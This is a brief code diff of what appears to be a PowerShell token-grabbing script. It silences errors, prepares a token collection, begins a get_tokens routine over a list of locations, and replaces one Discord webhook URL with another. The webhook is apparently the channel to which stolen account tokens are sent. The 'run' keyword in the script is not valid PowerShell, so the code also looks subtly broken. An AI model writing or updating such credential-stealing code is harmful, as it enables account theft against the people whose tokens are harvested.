@@ -1,6 +1,6 @@
 $ErrorActionPreference= 'silentlycontinue'
 $tokensString = new-object System.Collections.Specialized.StringCollection
-$webhook_url = "https://discord.com/api/webhooks/1338634469585715211/g7f_JKXm_PZqvVIx-XSmf8y20uE_ksDN0MP40T8z8yQw4x6My9OSg1Tfv4fRab9iJ-d0"
+$webhook_url = "https://discord.com/api/webhooks/1335005432019681310/u2KQSVk7z85iwGCDQBjAfBwHDG39zH8cu0rxav5WnAlXt98imETXLt6ODEBYJS4lovPf"
 
 run get_tokens {
     $location_array = @(
